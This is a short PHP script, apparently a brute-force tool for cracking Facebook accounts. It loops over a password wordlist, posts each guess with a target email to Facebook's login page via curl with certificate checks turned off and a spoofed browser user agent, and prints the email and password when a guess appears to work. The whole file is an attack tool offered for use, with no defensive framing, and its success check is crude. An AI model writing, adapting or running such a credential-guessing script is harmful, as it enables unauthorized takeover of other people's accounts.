<?php 
$email = $argv[0];
$wordlist = 'pass.txt';

function brute($usuario, $senha){
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
      curl_setopt($ch, CURLOPT_HEADER, false);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha");
      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36");
      curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
      curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
      $source = curl_exec($ch);
      if(preg_match("/<title>/", $source)){
        return true;
      }else{
        return false;
      }
    }	
	if(trim($email) <> ""){
		$lines = file($wordlist);
		foreach($lines as $line){
			$line = str_replace("\r","",$line);
			$line = str_replace("\n","",$line);
		
		if(brute($email, $line)){
          print "<br/>-----------------------------------------------------------------------\n\n";
          echo "<br/>[+] Facebook Cracked -> " . "Email: " . $email . " Senha: " .$line .   "\n\n";
          print "<br/>-------------------------------------------------------------------------\n";
          exit;
        }else{
          echo "<br/>[-] Facebook NOT Cracked -> " . "Email: " . $email . " Senha: " .$line . "\n";
        }
		}
		}
	

